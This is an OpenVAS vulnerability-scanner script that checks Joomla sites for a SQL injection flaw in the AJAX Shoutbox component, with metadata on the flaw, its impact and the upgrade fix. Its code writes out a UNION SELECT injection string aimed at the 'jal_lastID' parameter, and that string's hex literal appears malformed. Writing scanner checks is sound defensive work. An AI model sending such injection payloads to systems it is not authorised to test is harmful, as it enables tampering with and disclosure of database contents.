###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_ajax_shoutbox_sql_inj_vuln.nasl 2780 2016-03-04 13:12:04Z antu123 $
#
# Joomla Component AJAX Shoutbox SQL Injection Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804338";
CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 2780 $");
  script_bugtraq_id(66261);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-03-04 14:12:04 +0100 (Fri, 04 Mar 2016) $");
  script_tag(name:"creation_date", value:"2014-03-18 10:00:07 +0530 (Tue, 18 Mar 2014)");
  script_name("Joomla Component AJAX Shoutbox SQL Injection Vulnerability");

  tag_summary =
"This host is installed with Joomla! component ajax shoutbox and is prone to
sql injection vulnerability.";

  tag_vuldetect =
"Send a crafted exploit string via HTTP GET request and check whether it is
possible to execute sql query or not.";

  tag_insight =
"The flaw is due to insufficient validation of 'jal_lastID' HTTP GET parameter
passed to 'index.php' script.";

  tag_impact =
"Successful exploitation will allow attacker to inject or manipulate SQL
queries in the back-end database, allowing for the manipulation or disclosure
of arbitrary data.

Impact Level: Application";

  tag_affected =
"Joomla AJAX Shoutbox version 1.6 and probably earlier.";

  tag_solution =
"Upgrade to Joomla AJAX Shoutbox version 1.7 or later,
For updates refer to http://batjo.nl/shoutbox";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://secunia.com/advisories/57450");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/32331");
  script_xref(name : "URL" , value : "http://extensions.joomla.org/extensions/communication/shoutbox/43");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/joomla-ajax-shoutbox-sql-injection");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/125721/Joomla-AJAX-Shoutbox-SQL-Injection.html");
  script_summary("Check if Joomla AJAX Shoutbox is vulnerable to SQL injection");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

##
## Code starts here
##

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get Joomla Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:http_port)){
  exit(0);
}

## Construct the attack request
url = dir + "/?mode=getshouts&jal_lastID=1337133713371337+union+select+c" +
             "oncat(0x673716C2D696E6A656374696F6E2D74657374),1,1,1,1,1";

## Check the response to confirm vulnerability, extra check not possible
if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
               pattern:"sql-injection-test"))
{
  security_message(http_port);
  exit(0);
}
